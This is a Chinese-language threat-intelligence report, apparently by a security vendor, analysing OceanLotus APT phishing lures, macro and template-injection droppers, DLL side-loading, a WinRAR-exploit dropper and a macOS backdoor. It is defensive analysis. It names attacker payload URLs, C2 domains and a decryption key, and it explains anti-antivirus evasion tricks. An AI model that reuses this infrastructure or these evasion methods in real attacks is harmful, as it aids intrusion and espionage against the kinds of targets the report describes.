## 背景及概述

 **海莲花（OceanLotus）是一个据称越南背景的APT组织。该组织最早于2015年5月被天眼实验室所揭露并命名，其攻击活动最早可追溯到2012 年
4月，攻击目标包括中国海事机构、海域建设部门、科研院所和航运企业，后扩展到几乎所有重要的组织机构，并持续活跃至今。**

![海莲花](https://image.3001.net/images/20190509/1557385072_5cd3cf70d75b9.png!small)

而实际上，根据各安全厂商机构对该组织活动的拼图式揭露，海莲花团伙除针对中国发起攻击之外，其攻击所涉及的国家分布非常广泛，包括越南周边国家，如柬埔寨、泰国、老挝等，甚至包括越南的异见人士、媒体、地产公司、外资企业和银行。

奇安信红雨滴(RedDrip)安全研究团队（前天眼实验室）一直对海莲花团伙的活动保持高强度的跟踪，在近期发现其自2019年以来对中南半岛的国家最新的攻击活动中使用的初始投放载荷文件和攻击利用技术，并且结合奇安信威胁情报数据，关联到一系列的攻击事件。

本报告中我们向安全业界分享对海莲花组织针对越南国内以及越南周边国家最新的攻击利用技术、攻击载荷、及相关攻击事件的分析和总结，希望我们共同增进对海莲花这个极其活跃的APT团伙的了解。

## 针对不同国家的攻击

以下为我们整理了2018年末至今的一些针对中南半岛的部分国家发起攻击的典型案例，其他未提及的样本可参考文末的IOC列表。

### 越南

 **压缩包类诱饵**

2019年4月1日，红雨滴(ReDrip)安全研究团队在日常监控海莲花的攻击活动过程中，发现了一个越南语的文件名“Hop dong
sungroup.rar”。

其对应的中文为”大阳城合同”，压缩包内有重命名为Noidung chi tiet hop dong sungroup can chinh
sua的winword.exe，对应的中文为”请参阅详细信息”。

![海莲花](https://image.3001.net/images/20190509/1557385084_5cd3cf7c2fc1a.png!small)

除此之外，我们还关联到另一个翻译后为”太阳城集团”的压缩包诱饵SUN_GROUP_CORPORATION。其压缩包内的文件名如下：

> Noi dungcan xac thuc va sua gui den CONG TY CO PHAN TAP DOAN MAT TROI Bo Tai
> Chinh.exe

对应中文为”需要进行身份验证和编辑，以便发送给财政部 - 太阳集团合股”COMPANY

![海莲花](https://image.3001.net/images/20190509/1557385091_5cd3cf83b2815.png!small)

经过查询发现太阳城集团实际上是越南最大的房地产开发商之一。

![海莲花](https://image.3001.net/images/20190509/1557385099_5cd3cf8b57ded.png!small)

而这两个样本均由越南上传。因此我们猜测，海莲花组织在针对太阳城内部员工进行钓鱼攻击。

除了针对越南房地产业外，我们还发现该组织会针对越南国家银行进行钓鱼攻击：

相关样本的压缩包名为CPLH-NHNN-01-2019.rar，样本对应的日期为2019年1月22日，攻击极可能发生在相近的时间段内。

![海莲花](https://image.3001.net/images/20190509/1557385115_5cd3cf9bd8fa9.png!small)

压缩包名对应的中文为：“越南国家银行-01-2019.rar”；而压缩包中的winword.exe被重命名为“ChiPhiLienHoanNHNN-BC2019.exe”，翻译后为：“越南国家银行SBV-BC 2019.exe”

SBV指的是越南央银越南国家银行(SBV)，而BC其实指的是B2C，即第三方支付。

![海莲花](https://image.3001.net/images/20190509/1557385123_5cd3cfa31f233.png!small)

该次攻击大概率是针对银行内部员工发起的，类似于伪装成银行内部的第三方支付的文档传输过程。

除此之外，还有通过杀毒软件相关信息进行伪装的钓鱼。

压缩包名：“Gui lai choMS.MAI post content kaspersky.rar”（返回MS.MAI发布内容kaspersky）

![海莲花](https://image.3001.net/images/20190509/1557385135_5cd3cfaf937d9.png!small)

我们看到还会以精油为主题进行钓鱼：

“Tinh dau can mua”（需要购买精油），压缩包内的PE文件名为“有关购买和购买的详细信息”

![海莲花](https://image.3001.net/images/20190509/1557385142_5cd3cfb6c02d5.png!small)

 **文档类诱饵**

上述的压缩包带有卡巴斯基名称的诱饵，在诱饵文档方面也同样有类似的命名“Content marketing
Kaspersky.doc”，文档打开后显示如下，为越南语版本的诱导点击启用宏的攻击手法。

![海莲花](https://image.3001.net/images/20190509/1557385155_5cd3cfc3dfe56.png!small)

除此之外，我们还发现海莲花投放了大量伪装成简历的攻击钓鱼活动，我们内部将其命名为 **OceanCV**
活动，而该活动直接将海莲花目前常用的3种宏攻击手段全部曝光。

首先，我们先对样本名进行分析，可见样本名均为CV开头，命名也具有特点，主要以下3种：

> 1、CV-人名（如：CV-NguyenQuynhChi.docx）
>
> 2、CV-人名-岗位 （如：CV-AnthonyWei-CustomerService.docx）
>
> 3、CV-随机数字+英文为主 （如：CV-103237-EWQDSD.doc）

值得注意的是，有的样本在打开后会显示提示需要启用宏的标识：

![海莲花](https://image.3001.net/images/20190509/1557385163_5cd3cfcb91558.png!small)

但是，当你往下拉一下进度条后，你会发现越南语编写的简历，这在一系列活动中大部分样本均如此，并且简历均不一致。

![海莲花](https://image.3001.net/images/20190509/1557385171_5cd3cfd321635.png!small)

而这批简历钓鱼的样本所利用的方式也各不一样。有的使用海莲花MSO宏（RedDrip内部命名MSOMacro）

![海莲花](https://image.3001.net/images/20190509/1557385178_5cd3cfda6539d.png!small)

有的使用了模板注入技术：

![海莲花](https://image.3001.net/images/20190509/1557385183_5cd3cfdf921f4.png!small)

有的使用了宏代码转为1磅字体隐藏在文档中的技术（后来升级为白色1磅字体，RedDrip内部命名OHNMacro）

![海莲花](https://image.3001.net/images/20190509/1557385191_5cd3cfe7d3406.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385196_5cd3cfec70978.png!small)

在以下章节我们会分别详细分析这3种宏的利用分析。

而根据这批简历样本，我们对这3种宏文档进行同源样本关联后，结合各种维度，最后发现了大量海莲花专属恶意宏样本，详细可见Office样本关联章节。

 **利用”永恒之蓝”系列漏洞攻击**

我们还发现海莲花会利用“永恒之蓝”系列漏洞针对越南国内向政府提供软件的公司发起攻击。<https://www.tandan.com.vn/portal/home/default.aspx>
公司为越南的软件公司TAN DAN JSC。

![海莲花](https://image.3001.net/images/20190509/1557385204_5cd3cff43cc41.png!small)

 **该公司会向政府提供邮件服务器，官方公报数据库系统，公民身份管理系统等等。**

![海莲花](https://image.3001.net/images/20190509/1557385210_5cd3cffa05250.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385216_5cd3d00073ae3.png!small)![海莲花](https://image.3001.net/images/20190509/1557385222_5cd3d0063c216.png!small)

在攻击成功后，其会分发木马，我们去年编写的报告《疑似“海莲花”组织早期针对国内高校的攻击活动分析》中利用永恒之蓝攻击高校的木马一致。

> <https://ti.qianxin.com/blog/articles/oceanlotus-targets-chinese-> university/>

 **利用WinRAR漏洞投放伪装成越南浏览器coccoc的更新程序进行钓鱼攻击**

传统的利用白加黑机制、宏文档和网站渗透分发恶意Payload以外，海莲花也会利用最新的Winrar漏洞针对越南发起攻击。以下便是我们捕获的其中一个案例：

压缩包名称为“TUT_Photoshop_scan_Bank_ID.rar”

![海莲花](https://image.3001.net/images/20190509/1557385229_5cd3d00d79fb3.png!small)

从该样本触发漏洞解压的文件来看，其名称为CocCocUpated.exe

![海莲花](https://image.3001.net/images/20190509/1557385236_5cd3d01451dba.png!small)

COCCOC
是越南一家成立于2013年的新兴技术公司，提供在线网络搜索引擎服务和浏览器，主要使用的语言越南语和英语，所提供的搜索服务是越南最成熟的，浏览器是基于谷歌Chromium开发而成，支持Windows、iOS平台。

![海莲花](https://image.3001.net/images/20190509/1557385243_5cd3d01b21de3.png!small)

我们通过分析发现，其为海莲花的早期木马框架，我们同样将其放在样本分析一节单独分析。

当然，除了上面的诱饵，我们还发现海莲花会使用压缩包内嵌MP4的方式进行漏洞利用投放，压缩包名称翻译后大致为“Cho Ray医院的独家重磅影像”，其中Cho
Ray指的是越南胡志明市大水镬 **医院** (Chợ Rẫy)，为越南胡志明市最大的综合医院。

![海莲花](https://image.3001.net/images/20190509/1557385259_5cd3d02b13b49.png!small)
压缩包内有两个MP4文件，除了其中一个和压缩包名一致外，还有一个翻译后名称为“独家在中风新闻发布后，该小组开始配备人员”的视频

![海莲花](https://image.3001.net/images/20190509/1557385268_5cd3d0345d505.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385274_5cd3d03ab011f.png!small)

同样，释放的为CocCocUpdated.exe

![海莲花](https://image.3001.net/images/20190509/1557385279_5cd3d03fc032d.png!small)

而其分发手段却是通过网盘的方式进行投放。

![海莲花](https://image.3001.net/images/20190509/1557385285_5cd3d045674b2.png!small)

在样本分析章节中将对该新木马进行详细分析。

使用独有MAC后门并伪装正常程序的攻击  

海莲花除了会在Windows平台上针对越南进行攻击外，还会针对MacOS平台向越南用户发起攻击，下图几个样本便是近期的投放典型，其使用诸如浏览器更新，Flash安装更新包，字体安装包，伪装成文档实际为安装程序的手段进行攻击。

![海莲花](https://image.3001.net/images/20190509/1557385293_5cd3d04d3852b.png!small)

有趣的是，当我们在分析伪装成火狐的样本时，打开后会显示安装Firefox的界面，双击Firefox这个图标，会执行起来木马：

![海莲花](https://image.3001.net/images/20190509/1557385299_5cd3d05395e37.png!small)

同是会弹出假冒的FireFox的界面，点击更新，即使断网，也会出现下载进度条，实际上都是伪装的。

![海莲花](https://image.3001.net/images/20190509/1557385305_5cd3d05950b15.png!small)

这是攻击者画的假界面：

![海莲花](https://image.3001.net/images/20190509/1557385312_5cd3d060b9950.png!small)

同样，在接下来的章节中，我们将这批针对越南的MacOS样本进行了扩展分析。

### 柬埔寨

下面为今年海莲花针对柬埔寨的最新攻击，文件名为“Report-No.0162(02 Pages).doc”，对应中文名称为：报告No.0162（02页）

样本运行流程如下图所示：

![海莲花](https://image.3001.net/images/20190509/1557385319_5cd3d067dc264.png!small)

通过同源关联到的样本如下：

MD5  |  文件名  |  文档创建时间  
---|---|---  
56b5a96b8582b32ad50d6b6d9e980ce7  |  Request Comment on UYFC.doc  |
2019-03-18 04:12:00  
3fd2a37c3b8d9eb587c71ceb8e3bb085  |  No.039714(cdri).doc  |  2019-03-25
04:33:00  
  
而关联到的针对柬埔寨攻击的样本RequestComment on UYFC.doc （请求对UYFC发表评论）。

UYFC实际上是柬埔寨青年联合会|UYFC非政府组织，以此来攻击可能与该会议有关的人员。

![海莲花](https://image.3001.net/images/20190509/1557385329_5cd3d071df400.png!small)

文档截图：

![海莲花](https://image.3001.net/images/20190509/1557385335_5cd3d07741ec2.png!small)

No.039714(cdri).doc的文档截图：

![海莲花](https://image.3001.net/images/20190509/1557385342_5cd3d07eb335d.png!small)

可以明显看出，针对柬埔寨的攻击也采用了OHN宏。

除了利用文档进行攻击之外，去年海莲花还会利用MacOS样本针对柬埔寨进行攻击，相关的样本：“Scanned Investment Report-July
2018.zip” （扫描投资报告 - 2018年7月）

### 泰国

2019年以来，海莲花针对泰国发起的典型攻击案例如下

MD5  |  文件名  |  文档创建时间  
---|---|---  
4c30e792218d5526f6499d235448bdd9  |  Form_Provisional Agenda of the ASEAN
Senior Officials Preparatory Meeting.doc  |  2019-01-21 02:25:00  
d8a5a375da7798be781cf3ea689ae7ab  |  Program Retreat.doc  |  2019-01-14
03:50:00  
  
其中名为Form_ProvisionalAgenda of the ASEAN Senior Officials Preparatory
Meeting.doc最具有诱饵性，翻译后为”表格 - 东盟高级官员筹备会议的议程.doc”

而该会议实际上在2019年4月6日在泰国成功举行，从文档的创建时间和上传公网时间来看(2019-03-22)，可以看出海莲花组织在获取时事能力很强，并且筹备周期较长。

![海莲花](https://image.3001.net/images/20190509/1557385360_5cd3d090cf8c9.png!small)

而第二个文档Program Retreat（计划撤兵），则有可能是针对军事部门，不过由于名称意义广泛，并不能确认攻击者的实际意图。

并且上表中的2个文件的文档内容一样，下图为恢复文档中的shellcode字体后的截图：

![海莲花](https://image.3001.net/images/20190509/1557385366_5cd3d096e3cb8.png!small)

其同样采用了OHN宏。

## 样本分析

### “MSO宏”文档攻击流程

海莲花”MSO宏”具有通性，我们对其中一个样本进行分析，可见提取到的宏代码如下：

首先其会把数据通过Data变量相加，然后通过base64解密后，解密出vbs代码，释放到msohtml.log，并把wscript.exe复制到windows\SysWOW64\msohtml.exe中：

![海莲花](https://image.3001.net/images/20190509/1557385376_5cd3d0a0a99c5.png!small)

通过复制的msohtml.exe（就是wcript.exe）执行msohtml.log脚本，如图：

![海莲花](https://image.3001.net/images/20190509/1557385384_5cd3d0a8a0c7e.png!small)

并创建计划任务：

![海莲花](https://image.3001.net/images/20190509/1557385393_5cd3d0b119952.png!small)

msohtml.log脚本的内容如下，会把cs数组里的数据和518异或后，执行起来：

![海莲花](https://image.3001.net/images/20190509/1557385400_5cd3d0b80d406.png!small)

解密后的脚本如图，会把cs数组中的元素异或415后执行恶意代码：

![海莲花](https://image.3001.net/images/20190509/1557385405_5cd3d0bd78ce6.png!small)

解密后的恶意代码如图：会从<https://open.betaoffice.net/cvfemale.png>下载代码并执行。

![海莲花](https://image.3001.net/images/20190509/1557385411_5cd3d0c32b0c7.png!small)

### “OHN宏”文档攻击流程

从该样本中提取到宏代码，打开word文稿，会提示启用宏，启用宏后会执行这个函数：

![海莲花](https://image.3001.net/images/20190509/1557385416_5cd3d0c8985ab.png!small)

然后会把自身的office文档拷贝到temp下，命名为随机名，如图：

![海莲花](https://image.3001.net/images/20190509/1557385421_5cd3d0cdd7804.png!small)

然后修改注册表宏的安全性：

![海莲花](https://image.3001.net/images/20190509/1557385427_5cd3d0d3da286.png!small)

取段落总数的倒数第五段数据（一共5段数据，2个空行，3个有hex数据），从hex转成bin后，加到新文件的宏代码里面，然后设置1秒后执行该宏代码的x_N0th1ngH3r3方法：

![海莲花](https://image.3001.net/images/20190509/1557385433_5cd3d0d95075c.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385438_5cd3d0deb7dc9.png!small)

该格式文件是1磅的文字，肉眼看不到的，如图：

![海莲花](https://image.3001.net/images/20190509/1557385445_5cd3d0e538dde.png!small)

第一段清除格式之后的数据：

![海莲花](https://image.3001.net/images/20190509/1557385451_5cd3d0eb55372.png!small)

数据转换成bin后，成第二段宏代码，会被第一段宏代码执行x_N0th1ngH3r3函数，如图：

![海莲花](https://image.3001.net/images/20190509/1557385457_5cd3d0f1e369c.png!small)

同样的方式执行倒数第3段的宏代码，如图：

![海莲花](https://image.3001.net/images/20190509/1557385463_5cd3d0f787bc1.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385467_5cd3d0fbefe63.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385473_5cd3d1016c81a.png!small)

也是从这个函数开始：

![海莲花](https://image.3001.net/images/20190509/1557385479_5cd3d10716563.png!small)

取倒数第二段的数据，如图：

![海莲花](https://image.3001.net/images/20190509/1557385486_5cd3d10ea62d8.png!small)

数据如下：

![海莲花](https://image.3001.net/images/20190509/1557385491_5cd3d113ceb59.png!small)

然后写到内存中执行：

![海莲花](https://image.3001.net/images/20190509/1557385497_5cd3d1192992c.png!small)

数据hex转成bin后是海莲花用的比较多的shellcode，如图：

![海莲花](https://image.3001.net/images/20190509/1557385511_5cd3d12707361.png!small)

配置文件:

![海莲花](https://image.3001.net/images/20190509/1557385518_5cd3d12eb610a.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385524_5cd3d13495c59.png!small)

这种是通过三次宏内存加载shellcode的方式主要是为了对抗杀软静态的查杀。

### 模板注入类文档攻击流程

海莲花的模板注入类文档具有通用性，在文档启动后，其均会去加载XXX.XXX/XXX.png

并执行接下来的操作。

![海莲花](https://image.3001.net/images/20190509/1557385531_5cd3d13b1de5b.png!small)

这里举其中一次攻击的例子，fdsw.png是一个office 复合文档：

(d497bd06b34a046841bb63d3bf20e605)

![海莲花](https://image.3001.net/images/20190509/1557385537_5cd3d14113361.png!small)

提取出来宏，刚开始会通过SysWOW64\cmd.exe文件是否存在，判断系统是32位或者64位：

![海莲花](https://image.3001.net/images/20190509/1557385543_5cd3d1470f8ac.png!small)

根据不同的系统，把文件从cell中取出来，经过base64解码，落地到：%appdata%\main_background.png:

![海莲花](https://image.3001.net/images/20190509/1557385548_5cd3d14c39f4c.png!small)

然后根据根据不同的操作系统位数选择不同的写注册表的方式，劫持的CSID都是“{2DEA658F-54C1-4227-AF9B-260AB5FC3543}”

![海莲花](https://image.3001.net/images/20190509/1557385555_5cd3d153559c3.png!small)

根据这个CSID，发现劫持的是这个DLL的CSID：%SystemRoot%\System32\PlaySndSrv.dll

![海莲花](https://image.3001.net/images/20190509/1557385562_5cd3d15a7e36c.png!small)

该dll是用来播放声音的。

对cell里面base64的内容的提取内容如下：

![海莲花](https://image.3001.net/images/20190509/1557385572_5cd3d1644a013.png!small)

Base64解开的其中的一个32位的PE，Dllmain会申请0x34aca字节的内存空间，然后把0x10012760处的shellcode写入到内存中，通过线程执行起来：

![海莲花](https://image.3001.net/images/20190509/1557385579_5cd3d16b852f2.png!small)

Shellcode去0xfc8偏移处的指针当参数传到sub_160018的函数中：

![海莲花](https://image.3001.net/images/20190509/1557385621_5cd3d195d1d54.png!small)

而0xfc8偏移处的地址放着命令行参数和一个PE：

![海莲花](https://image.3001.net/images/20190509/1557385627_5cd3d19bc4132.png!small)

sub_160018函数的功能主要是在内存中加载后面的PE，然后把命令行传递过去，根据命令行参数去执行，下图为该PE接收命令行参数的代码：

![海莲花](https://image.3001.net/images/20190509/1557385634_5cd3d1a2ea5aa.png!small)

请求传过来的URL，把下载后的数据，经过DES解密后，在内存中加载起来。

![海莲花](https://image.3001.net/images/20190509/1557385640_5cd3d1a878258.png!small)

通过关联分析找到更多的样本：

根据编译时间排序如下：

![海莲花](https://image.3001.net/images/20190509/1557385646_5cd3d1ae2792a.png!small)

通过表格比较，第一个样本和其他样本的命令行都不一样，可以知道应该是不同次攻击的样本，该样本是带注释的版本，会用相同的方式在内存中加载shellcode，shellcode的功能是在内存中加载文件中包含的PE文件：

![海莲花](https://image.3001.net/images/20190509/1557385651_5cd3d1b3f2966.png!small)

而文件中包含的PE在一个黑客工具包中找到，文件名为： cmd[w7 ][x64].exe；

该样本的功能是通过文件中包含的cmd[w7
][x64].exe去执行mcods.exe（这个是海莲花之前用过的白利用程序的exe文件名），而mcods.exe应该是被前面的dropper释放的文件。

![海莲花](https://image.3001.net/images/20190509/1557385657_5cd3d1b9e5fae.png!small)

该样本的上传地点是VN，上传时间是7月31日，文件名是msvchr.exe，可以知道这个样本应该是针对越南攻击的：

![海莲花](https://image.3001.net/images/20190509/1557385664_5cd3d1c0095d1.png!small)

通过对这些样本的分析比较可以知道这些样本应该是用来专门在内存中执行exe文件，并传递命令行参数的Loader程序，是最近半年用到的新的恶意代码框架，专门用来开发对抗静态免杀的。

发现其中有2个样本是10M的，是末尾填充0x20（空格），填充成大文件避免被上传：

![海莲花](https://image.3001.net/images/20190509/1557385670_5cd3d1c6388ba.png!small)

而且这些样本的加载shellcode的方式有些不太一样：

1、大部分样本是通过创建线程执行shellcode

![海莲花](https://image.3001.net/images/20190509/1557385676_5cd3d1cc19d9f.png!small)

2、编译时间最早的那个样本，以服务的形式起来，带注释，在serviceMain里创建线程执行shellcode

![海莲花](https://image.3001.net/images/20190509/1557385681_5cd3d1d1d1e32.png!small)

3、少部分样本在主线程直接执行shellcode

![海莲花](https://image.3001.net/images/20190509/1557385687_5cd3d1d7330cf.png!small)

### wwlib白利用样本

通过亚马逊AWS下载的压缩包CPLH-NHNN-01-2019.rar分析，发现该压缩包把winword.exe白文件和wwlib.dll打包到一起投递；

他们使用winword.exe的白利用技术，winword.exe会默认加载同目录下的wwlib.dll；

之所以使用winword.exe的白利用技术，因为winword.exe的图标是word的图标，而且wwlib.dll是隐藏的，所以他们只需要把winword.exe修改为具有诱惑性的名称，受害者解压后只发现一个word图标的exe，就会打开运行：

![海莲花](https://image.3001.net/images/20190509/1557385695_5cd3d1df239a2.png!small)

wwlib.dll的恶意代码再FMain导出函数里，winword.exe打开会默认调用FMain这个导出函数，恶意代码就会执行起来；然后base64解码出自带的shellcode，然后在主线程中执行：

![海莲花](https://image.3001.net/images/20190509/1557385700_5cd3d1e498ab8.png!small)

Base64编码后的shellcode存放在样本中的位置：

![海莲花](https://image.3001.net/images/20190509/1557385706_5cd3d1ea55f6d.png!small)

发现解码后的shellcode和前面的shellcode的加载方式是一样的，把0x6b6偏移处的数据当参数传递给sub_16函数：

![海莲花](https://image.3001.net/images/20190509/1557385713_5cd3d1f1b94e7.png!small)

而sub_16函数的作用是解密0x6b6后面的数据，解密出第二层shellcode并执行，下图为解密出的第二层shellcode：

![海莲花](https://image.3001.net/images/20190509/1557385719_5cd3d1f766dd7.png!small)

第二层shellcode通过DES解密出第三层shellcode，密钥为“asfahdiuqhu93ye7891h9ubioufcf”：

![海莲花](https://image.3001.net/images/20190509/1557385726_5cd3d1fec44ec.png!small)

第三层shellcode的入口和前面2个shellcode的入口都是一样的，也通过call/pop方式找到shellcode加载到内存中的位置，然后取代码后面的数据（0x8c6偏移处）当参数传递到sub_16函数中，传递的参数为：https[:]//office.allsafebrowsing.com/AwPT：

![海莲花](https://image.3001.net/images/20190509/1557385734_5cd3d206a8648.png!small)

该shellcode从https[:]//office.allsafebrowsing.com/AwPT下载文件，然后在内存中执行，下图为下载该文件用到的UA：

![海莲花](https://image.3001.net/images/20190509/1557385740_5cd3d20cb8863.png!small)

下载回来的AwPT文件是cobaltstrike的shellcode模块：

![海莲花](https://image.3001.net/images/20190509/1557385747_5cd3d213c00f5.png!small)

下图为解密后面附加数据的算法，和cobaltstrike的shellcode模块一样，和以往的不同处是偏移往后移动了8个字节：

![海莲花](https://image.3001.net/images/20190509/1557385754_5cd3d21ae383e.png!small)

解密后的数据是一个beacon模块，如图：

![海莲花](https://image.3001.net/images/20190509/1557385760_5cd3d220cf539.png!small)

提取配置文件信息如下：

![海莲花](https://image.3001.net/images/20190509/1557385771_5cd3d22b0466f.png!small)

### MAC后门

分析对象为伪装成浏览器的MAC后门。

![海莲花](https://image.3001.net/images/20190509/1557385778_5cd3d2328405f.png!small)

解压后的文件结构如下，是一个macOS的安装包，如图：

![海莲花](https://image.3001.net/images/20190509/1557385783_5cd3d23747676.png!small)

打开后会显示安装Firefox的界面，双击Firefox这个图标， **会执行起来** **Dropper** **流程**
：![海莲花](https://image.3001.net/images/20190509/1557385788_5cd3d23c53f45.png!small)

会弹出假冒的FireFox的界面，点击更新，即使断网，也会出现下载进度条，都是攻击者伪造的：

![海莲花](https://image.3001.net/images/20190509/1557385795_5cd3d2436a6c8.png!small)

这是攻击者画的假界面：

![海莲花](https://image.3001.net/images/20190509/1557385801_5cd3d2493298d.png!small)

Dropper运行起来后会在Library目录下创建以下APP，实现开机启动：

> /Users/username/Library/LaunchAgents/com.apple.spell.agent.plist

![海莲花](https://image.3001.net/images/20190509/1557385807_5cd3d24fa2c40.png!small)

该app中的开机启动目录指向该目录：/Users/username/Library/Spelling/的spellagentd文件，该文件时OSX的bin文件，代码做了加壳处理，会在内存中解密出shellcode并执行，如图：

![海莲花](https://image.3001.net/images/20190509/1557385813_5cd3d2554bc58.png!small)

执行起来后会回连地址：rio.imbandaad.com，通过Post请求把数据包发送到服务器：<http://rio.imbandaad.com/v3/yQ/r/eiCu1gd6Qme.js>

![海莲花](https://image.3001.net/images/20190509/1557385819_5cd3d25b04882.png!small)

但是该地址已经失效。该App的签名信息如下：

### CocCocUpdate分析与关联

CocCocUpdate是一个Dropper，被利用CVE-2018-20250漏洞构造的压缩包释放到startup目录下，压缩包截图如下：

![海莲花](https://image.3001.net/images/20190509/1557385969_5cd3d2f1b265d.png!small)

重启后会被系统执行起来，对应的文件为CocCocUpdate.exe，我们在2015年曝光过一个通过命令行参数传递随机密钥的Dropper版本，这个CocCocUpdate.exe改进为通过环境变量传递随机密钥。

具体的步骤为：

1、 获取执行起来的CocCocUpdate.exe的全路径，存在值为“C091A8C8”的环境变量中，以便后面的程序去读取。

![海莲花](https://image.3001.net/images/20190509/1557385979_5cd3d2fbaca7b.png!small)

2、 随机生成128字节的密钥，存到值为“DB99050C”的环境变量中；用来加密自身后面的资源数据(shellcode)。

![海莲花](https://image.3001.net/images/20190509/1557385984_5cd3d300b9211.png!small)

![海莲花](https://image.3001.net/images/20190509/1557385990_5cd3d306b1cd4.png!small)3、
把通过随机密钥加密0x40E000位置处的数据，并把修改后的该PE文件写入到Temp目录下，然后通过CreateProcess执行起来：

![海莲花](https://image.3001.net/images/20190509/1557385996_5cd3d30cd53f3.png!small)

![海莲花](https://image.3001.net/images/20190509/1557386003_5cd3d3130f862.png!small)![海莲花](https://image.3001.net/images/20190509/1557386008_5cd3d3189f9af.png!small)下图为原文件和加密后的文件比较的结果，可以看出代码段没有任何变化，只是0xd000的全局变量数组被随机密钥加密了。

![海莲花](https://image.3001.net/images/20190509/1557386015_5cd3d31fc7868.png!small)4、
如果该文件被捆绑内容的话，会从资源类型为10，资源号为1的资源中解密释放一个被捆绑的文件（密钥在后64字节），比如Word文档或者正常文件，然后通过ShellExectue执行起来，该文件没有使用释放捆绑的诱饵文件，所以ID是错误的：

![海莲花](https://image.3001.net/images/20190509/1557386030_5cd3d32ea561a.png!small)

![海莲花](https://image.3001.net/images/20190509/1557386037_5cd3d3351f230.png!small)

5、被执行起来的temp进程，会先判断是否有被设置的“C091A8C8”的环境变量，如果有的话说明是被原始Dropper加密起来的，就会从“DB99050C”的环境变量中读取随机生成的128位密钥，解密出0x40e000处的代码，然后再多解密一层解压一层，因为代码在原始Dropper中就是有一层加密和压缩的：

![海莲花](https://image.3001.net/images/20190509/1557386043_5cd3d33bc9db6.png!small)

解压：

![海莲花](https://image.3001.net/images/20190509/1557386050_5cd3d342d3fec.png!small)

6、解密后的文件是一个PE文件，解密后会在内存中执行起来，如图：

![海莲花](https://image.3001.net/images/20190509/1557386058_5cd3d34a49601.png!small)

![海莲花](https://image.3001.net/images/20190509/1557386064_5cd3d3503d794.png!small)

该代码会释放3个文件到c:\program files\microsoft\windows\system restore\目录下：

![海莲花](https://image.3001.net/images/20190509/1557386070_5cd3d356834bd.png!small)

然后创建服务，指向rstrui.exe文件：

![海莲花](https://image.3001.net/images/20190509/1557386075_5cd3d35bbdec8.png!small)

该rstrui.exe是攻击者写的一个loader，伪装微软的WindowsSystem Restore图标：

![海莲花](https://image.3001.net/images/20190509/1557386080_5cd3d360a5068.png!small)

主要是负责通过rundll32加载同目录下的{9FBAA883-1709-4DE3-8C1B-48683F740A5F}.clsid文件，传递参数也是通过环境变量的方式传递的，这种方法海莲花团伙在2017年的时候也常常使用。

![海莲花](https://image.3001.net/images/20190509/1557386086_5cd3d366adb1e.png!small)

文件名为{9FBAA883-1709-4DE3-8C1B-48683F740A5F}.clsid的文件时一个DllLoader，PE信息如下：

![海莲花](https://image.3001.net/images/20190509/1557386093_5cd3d36d648ac.png!small)

该dll的功能主要是解密并加载同目录下的名字为{9FBAA883-1709-4DE3-8C1B-48683F740A5F}的shellcode，如图：

![海莲花](https://image.3001.net/images/20190509/1557386099_5cd3d3737d98e.png!small)

进入sub_10001480函数内，会解密出该文件的内容，并在内存中加载该PE:

![海莲花](https://image.3001.net/images/20190509/1557386105_5cd3d37919b31.png!small)

在内存中解密后的PE如图：

![海莲花](https://image.3001.net/images/20190509/1557386110_5cd3d37eed53e.png!small)

![海莲花](https://image.3001.net/images/20190509/1557386116_5cd3d384dc1a3.png!small)

DllMain创建一个线程，执行导出函数Version，Version函数里会一直执行远控的函数，失败的话休眠6s继续（这里表示休眠6s太短了）：

![海莲花](https://image.3001.net/images/20190509/1557386122_5cd3d38a8a89d.png!small)

然后会随机生成一个4以内的数字，随机选择C2，如图：

![海莲花](https://image.3001.net/images/20190509/1557386129_5cd3d3918fd12.png!small)

其中一个解密C2的函数如下：

![海莲花](https://image.3001.net/images/20190509/1557386135_5cd3d397cd6e7.png!small)

回连4个域名如下：

> images.ucange.com
>
> preload.ointalt.com
>
> maintenance.allidayser.com
>
> report.cottallid.com

通过域名关联到的样本的hash如下：

> 2ea902abe453b70cf77e402cc16eb552
>
> cc7b9ee1b026e16a9d37e3988a714479
>
> e60c35dd36c9f525007955e6b3a88b82

该同源样本中的捆绑文件：

cc7b9ee1b026e16a9d37e3988a714479捆绑的office文件内容如下：

![海莲花](https://image.3001.net/images/20190509/1557386141_5cd3d39d88b21.png!small)翻译：

![海莲花](https://image.3001.net/images/20190509/1557386147_5cd3d3a34e555.png!small)

2ea902abe453b70cf77e402cc16eb552捆绑的Office文件内容如下：  
![海莲花](https://image.3001.net/images/20190509/1557386152_5cd3d3a8c91b3.png!small)

翻译：

![海莲花](https://image.3001.net/images/20190509/1557386158_5cd3d3aeb274a.png!small)

该Dropper的流程图如下：

![海莲花](https://image.3001.net/images/20190509/1557386165_5cd3d3b5a18fa.png!small)

该版本Dropper和2015年版本的Dropper的比较：

>
> 1、2015年的Dropper是通过命令行参数传递随机生成的解密密钥，而该版本的Dropper是通过进程链间的环境变量实现密钥的传递（API是SetEnvironmentVariableW和GetEnvironmentVariableW）
>
> 2、2015年版本的存在检测虚拟机，该版本的不存在检测虚拟机。

下图为：2015年海莲花的Dropper版本通过“—ping”传递密钥：

![海莲花](https://image.3001.net/images/20190509/1557386173_5cd3d3bd4306c.png!small)

下图为：本次Dropper的版本把随机生成的密钥存在环境变量中：

![海莲花](https://image.3001.net/images/20190509/1557386178_5cd3d3c2bd4ac.png!small)

## 关联分析

### 木马样本关联

通过对海莲花的通用后门进行分析，通过其代码中的特征找到了大量同源样本：

MD5 |  编译时间 |  文件大小 |  模块名  
---|---|---|---  
ac5f18f1c20901472d4708bd06a2d191 |  2018-06-13,11:33:33 |  93184 |
DllHijack.dll  
221e9962c9e7da3646619ccc47338ee8 |  2018-06-25,02:35:46 |  93184 |
DllHijack.dll  
26ea45578e05040deb0cc46ea3103184 |  2018-07-02,02:11:55 |  142336 |
DllHijack.dll  
200033d043c13b88d121f2c1d8d2dfdf |  2018-07-09,03:00:10 |  2053632 |
DllHijack.dll  
9972111cc944d20c9b315fd56eb3a177 |  2018-07-13,03:48:03 |  142336 |
DllHijack.dll  
bf040c081ad1b051fdf3e8ba458d3a9c |  2018-07-23,03:11:16 |  93184 |
DllHijack.dll  
